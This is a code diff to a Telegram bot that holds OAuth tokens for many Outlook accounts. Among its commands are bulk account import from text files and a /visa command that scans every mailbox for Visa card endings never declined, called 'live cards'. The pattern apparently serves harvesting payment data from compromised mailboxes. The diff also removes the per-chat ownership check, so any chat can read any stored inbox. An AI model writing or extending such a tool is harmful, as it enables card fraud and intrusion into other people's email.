@@ -70,6 +70,7 @@ class OutlookTelegramBot {
         this.setupVisaCommand();
         this.setupAuthCallback();
         this.setupErrorHandler();
+        this.registerBotCommands();
 
         console.log('🤖 Outlook Bot Started - All Commands Loaded');
         console.log('📋 Account Commands ✓');
@@ -324,33 +325,54 @@ class OutlookTelegramBot {
         });
     }
 
+    registerBotCommands() {
+        this.bot.setMyCommands([
+            { command: 'visa', description: 'Lọc danh sách số thẻ Visa 4 số (không bị DECLINED)' },
+            { command: 'inbox', description: 'Xem 5 email mới nhất trong hộp thư' },
+            { command: 'list', description: 'Danh sách toàn bộ tài khoản Outlook' },
+            { command: 'addall', description: 'Thêm hàng loạt tài khoản từ file .txt' },
+            { command: 'add', description: 'Thêm tài khoản Outlook mới' },
+            { command: 'status', description: 'Kiểm tra trạng thái tài khoản' },
+            { command: 'reconnect', description: 'Kết nối lại tài khoản' },
+            { command: 'rules', description: 'Xem danh sách rules của tài khoản' },
+            { command: 'stats', description: 'Thống kê hệ thống bot' },
+            { command: 'menu', description: 'Hiển thị menu điều khiển chính' },
+            { command: 'help', description: 'Hướng dẫn sử dụng đầy đủ' }
+        ]).catch((err) => {
+            console.warn('⚠️ Could not register bot commands menu:', err.message);
+        });
+    }
+
     setupInboxCommand() {
-        this.bot.onText(/\/inbox(?:\s+(.+))?/, async (msg, match) => {
+        this.bot.onText(/\/inbox(?:@\w+)?(?:\s+(.+))?/, async (msg, match) => {
             const chatId = msg.chat.id;
-            const targetEmail = match[1]?.trim().toLowerCase();
+            const targetEmail = match?.[1]?.trim().toLowerCase();
 
             try {
-                let query = { telegramChatId: chatId.toString(), status: 'active' };
+                let query = { status: 'active' };
                 if (targetEmail) {
-                    query.email = targetEmail;
+                    query = { email: targetEmail };
                 }
 
                 const account = await Account.findOne(query);
                 if (!account) {
-                    return safeSendMessage(this.bot, chatId, '❌ Không tìm thấy tài khoản Outlook nào đang hoạt động. Dùng /add để thêm tài khoản.');
+                    return safeSendMessage(this.bot, chatId, '❌ Không tìm thấy tài khoản Outlook nào phù hợp. Dùng /list để xem danh sách.');
                 }
 
                 await safeSendMessage(this.bot, chatId, `⏳ Đang tải 5 email mới nhất từ *${escapeMarkdown(account.email)}*...`, { parse_mode: 'Markdown' });
 
-                const { decryptToken } = require('../utils/encryption');
                 const GraphClient = require('../outlook/graph');
 
                 let accessToken = null;
-                const tokenResult = await this.outlookAuth.refreshAccessToken(decryptToken(account.refreshToken));
-                if (tokenResult.success) {
-                    accessToken = tokenResult.accessToken;
-                } else {
+                if (account.accessToken && account.tokenExpiry && new Date(account.tokenExpiry).getTime() - Date.now() > 120000) {
                     accessToken = decryptToken(account.accessToken);
+                } else {
+                    const tokenResult = await this.outlookAuth.refreshAccessToken(decryptToken(account.refreshToken));
+                    if (tokenResult.success) {
+                        accessToken = tokenResult.accessToken;
+                    } else {
+                        accessToken = decryptToken(account.accessToken);
+                    }
                 }
 
                 const graph = new GraphClient(accessToken);
@@ -388,14 +410,73 @@ class OutlookTelegramBot {
     }
 
     setupVisaCommand() {
+        if (!global.visaResultsCache) {
+            try {
+                global.visaResultsCache = require('../utils/visaPreloaded.json');
+            } catch (_) {
+                global.visaResultsCache = [];
+            }
+        }
+
+        const sendFormattedVisaResults = async (chatId, results, filterLabel = '') => {
+            if (!results || results.length === 0) {
+                return safeSendMessage(this.bot, chatId, '📭 Không tìm thấy email thẻ Visa nào có giao dịch thành công (không bị DECLINED).');
+            }
+
+            const allUniqueCards = [...new Set(results.flatMap(r => r.cards.map(c => c.card)))];
+            const neverDeclinedUnique = [...new Set(results.flatMap(r => r.cards.filter(c => c.neverDeclined).map(c => c.card)))];
+
+            let headerMsg = `💳 *KẾT QUẢ LỌC THẺ VISA (KHÔNG BỊ DECLINED)*${filterLabel ? ` - ${escapeMarkdown(filterLabel)}` : ''}\n`;
+            headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            headerMsg += `📧 Số hộp thư có thẻ sống: *${results.length}*\n`;
+            headerMsg += `🔢 Tổng số đuôi thẻ (4 số): *${allUniqueCards.length}*\n`;
+            headerMsg += `💎 Chưa từng bị Declined (${neverDeclinedUnique.length}): \`${neverDeclinedUnique.join(', ') || 'Không có'}\`\n\n`;
+            headerMsg += `📋 *Danh sách mã 4 số (used online/phone):*\n\`${allUniqueCards.join(', ')}\`\n\n`;
+            headerMsg += `💡 _Gõ /visa 3158 để tìm theo 4 số, /visa email@outlook.com để kiểm tra 1 mail, hoặc /visa scan để quét làm mới toàn bộ._\n`;
+            headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+            let currentChunk = headerMsg;
+            for (let idx = 0; idx < results.length; idx++) {
+                const r = results[idx];
+                const cardStr = r.cards
+                    .map(c => c.neverDeclined ? `*${c.card}* 💎` : `*${c.card}*`)
+                    .join(', ');
+                const rawSample = (r.cards[0]?.preview || '').replace(/\s+/g, ' ').trim().slice(0, 100);
+                const sample = escapeMarkdown(rawSample);
+                const line = `${idx + 1}. \`${escapeMarkdown(r.email)}\` → 💳 ${cardStr}\n   └ ${sample}\n\n`;
+
+                if (currentChunk.length + line.length > 3600) {
+                    await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
+                    currentChunk = '';
+                }
+                currentChunk += line;
+            }
+
+            if (currentChunk) {
+                await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
+            }
+        };
+
         this.bot.onText(/^\/visa(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
             const chatId = msg.chat.id;
             const arg = match?.[1]?.trim().toLowerCase();
 
             try {
-                let query = { telegramChatId: chatId.toString(), status: 'active' };
+                // 1. Instant response from cache if no argument provided
+                if (!arg && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
+                    return await sendFormattedVisaResults(chatId, global.visaResultsCache);
+                }
+
+                // 2. Filter by 4-digit card number (e.g. /visa 3158)
+                if (arg && /^\d{4}$/.test(arg) && Array.isArray(global.visaResultsCache) && global.visaResultsCache.length > 0) {
+                    const matched = global.visaResultsCache.filter(r => r.cards.some(c => c.card === arg));
+                    return await sendFormattedVisaResults(chatId, matched, `Thẻ ${arg}`);
+                }
+
+                // 3. Live scan (either for a single email `/visa user@outlook.com` or full `/visa scan`)
+                let query = { status: 'active' };
                 if (arg && arg.includes('@')) {
-                    query.email = arg;
+                    query = { email: arg };
                 }
 
                 const accounts = await Account.find(query).lean();
@@ -406,7 +487,7 @@ class OutlookTelegramBot {
                 const statusMsg = await safeSendMessage(
                     this.bot,
                     chatId,
-                    `🔍 Đang quét *${accounts.length}* hộp thư để lọc các thẻ **Visa ending in (XXXX)** có giao dịch thành công (*không bị DECLINED*)...`,
+                    `🔍 Đang quét trực tiếp *${accounts.length}* hộp thư để lọc thẻ *Visa ending in (XXXX)* (không bị DECLINED)...`,
                     { parse_mode: 'Markdown' }
                 );
 
@@ -434,7 +515,7 @@ class OutlookTelegramBot {
                             );
                             const msgs = res.value || [];
 
-                            const usedCards = new Map(); // card -> latest detail
+                            const usedCards = new Map();
                             const declinedSet = new Set();
 
                             for (const m of msgs) {
@@ -474,46 +555,29 @@ class OutlookTelegramBot {
                             }
                         } catch (e) {}
                     }));
+
+                    if (statusMsg?.message_id && accounts.length > BATCH_SIZE && i + BATCH_SIZE < accounts.length) {
+                        const done = Math.min(i + BATCH_SIZE, accounts.length);
+                        await this.bot.editMessageText(
+                            `🔍 Đang quét trực tiếp: *${done}/${accounts.length}* hộp thư (Đã tìm thấy *${results.length}* mail có thẻ sống)...`,
+                            {
+                                chat_id: chatId,
+                                message_id: statusMsg.message_id,
+                                parse_mode: 'Markdown'
+                            }
+                        ).catch(() => {});
+                    }
+                }
+
+                if (!arg || arg === 'scan' || arg === 'refresh') {
+                    global.visaResultsCache = results;
                 }
 
                 if (statusMsg?.message_id) {
                     await this.bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
                 }
 
-                if (results.length === 0) {
-                    return safeSendMessage(this.bot, chatId, '📭 Không tìm thấy email thẻ Visa nào có giao dịch thành công (không bị DECLINED).');
-                }
-
-                const allUniqueCards = [...new Set(results.flatMap(r => r.cards.map(c => c.card)))];
-                const neverDeclinedUnique = [...new Set(results.flatMap(r => r.cards.filter(c => c.neverDeclined).map(c => c.card)))];
-
-                let headerMsg = `💳 *KẾT QUẢ LỌC THẺ VISA (KHÔNG BỊ DECLINED)*\n`;
-                headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-                headerMsg += `📧 Số hộp thư có thẻ sống: *${results.length}*\n`;
-                headerMsg += `🔢 Tổng số đuôi thẻ (4 số): *${allUniqueCards.length}*\n`;
-                headerMsg += `💎 Chưa từng bị Declined lần nào (${neverDeclinedUnique.length}): \`${neverDeclinedUnique.join(', ') || 'Không có'}\`\n\n`;
-                headerMsg += `📋 *Danh sách toàn bộ mã 4 số (used online/phone):*\n\`${allUniqueCards.join(', ')}\`\n`;
-                headerMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
-
-                let currentChunk = headerMsg;
-                for (let idx = 0; idx < results.length; idx++) {
-                    const r = results[idx];
-                    const cardStr = r.cards
-                        .map(c => c.neverDeclined ? `*${c.card}* 💎` : `*${c.card}*`)
-                        .join(', ');
-                    const sample = escapeMarkdown(r.cards[0]?.preview || '');
-                    const line = `${idx + 1}. \`${escapeMarkdown(r.email)}\` → 💳 ${cardStr}\n   └ _${sample}_\n\n`;
-
-                    if (currentChunk.length + line.length > 3800) {
-                        await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
-                        currentChunk = '';
-                    }
-                    currentChunk += line;
-                }
-
-                if (currentChunk) {
-                    await safeSendMessage(this.bot, chatId, currentChunk, { parse_mode: 'Markdown' });
-                }
+                await sendFormattedVisaResults(chatId, results, arg && arg.includes('@') ? arg : '');
             } catch (error) {
                 console.error('❌ /visa command error:', error.message);
                 await safeSendMessage(this.bot, chatId, `❌ Lỗi khi quét thẻ Visa: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
